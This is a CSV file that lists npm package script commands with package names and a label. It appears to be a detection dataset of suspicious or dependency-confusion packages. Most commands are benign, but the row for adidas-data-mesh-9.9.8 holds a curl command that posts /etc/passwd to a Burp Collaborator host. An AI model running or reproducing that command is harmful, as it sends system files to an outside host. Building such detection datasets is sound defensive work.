command,package_name,label
echo "Error: no test specified" && exit 1,a11y-test-app-1.0.0,1
node index.js,a11y-test-app-1.0.0,1
echo "Error: no test specified" && exit 1,account-settings-35.0.0,1
node app.js,account-settings-35.0.0,1
echo "Error: no test specified" && exit 1,account-statement-35.0.0,1
node app.js,account-statement-35.0.0,1
echo "Error: no test specified" && exit 1,act-rules.github.io-1.0.10,1
node index.js,act-rules.github.io-1.0.10,1
Ethical Purpose,adidas-data-mesh-9.9.8,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)aesic9l2whlwa33aytefcnu11s7jv8.burpcollaborator.net,adidas-data-mesh-9.9.8,1
echo "Error: no test specified" && exit 1,airbnb-env-99.99.991,1
node index.js,airbnb-env-99.99.991,1
echo "Error: no test specified" && exit 1,airbnb-erf-99.99.99,1
node index.js,airbnb-erf-99.99.99,1
echo "Error: no test specified" && exit 1,airbnb-i18n-polyglot-99.99.99,1
node index.js,airbnb-i18n-polyglot-99.99.99,1
echo "Error: no test specified" && exit 1,airbnb-l10n-99.99.99,1
node index.js,airbnb-l10n-99.99.99,1
echo "Error: no test specified" && exit 1,airbnb-mediator-99.99.99,1
node index.js,airbnb-mediator-99.99.99,1
echo "Error: no test specified" && exit 1,alksjdaskldjklj12kl3jkl12jkljaskldjaklsjdlkashjflksdjhfgkldsjlkgop123i4poiopals-99.0.0,1
node index.js,alksjdaskldjklj12kl3jkl12jkljaskldjaklsjdlkashjflksdjhfgkldsjlkgop123i4poiopals-99.0.0,1
echo "Error: no test specified" && exit 1,amap-core-2.0.1,1
node core.js,amap-core-2.0.1,1
echo "Error: no test specified" && exit 1,amhairc-web-6.0.0,1
node index.js,amhairc-web-6.0.0,1
echo "Error: no test specified" && exit 1,anddone-node-common-1.0.3,1
echo "Error: no test specified" && exit 1,angl-archtslint-2.0.1,1
node index.js,angl-archtslint-2.0.1,1
echo "Error: no test specified" && exit 1,apps-35.0.0,1
node app.js,apps-35.0.0,1
echo "Error: no test specified" && exit 1,asgiref-1.0.0,1
index.js,asgiref-1.0.0,1
echo "Error: no test specified" && exit 1,auto-assign-team-action-2000.0.0,1
node index.js,auto-assign-team-action-2000.0.0,1
node index.js > /dev/null 2>&1,awell-libs-1.999.0,1
echo "Error: no test specified" && exit 1,awell-libs-1.999.0,1
echo "Error: no test specified" && exit 1,azure-rest-api-specs-eng-tools-9.3.4,1
 node index.js,azure-rest-api-specs-eng-tools-9.3.4,1
echo "Error: no test specified" && exit 1,b2b-canaisdigitais-3.4.7,1
npm run test,banglamart-module-1.0.3,1
node index.js,banglamart-module-1.0.3,1
echo "Error: no test specified" && exit 1,bank-settings-35.0.0,1
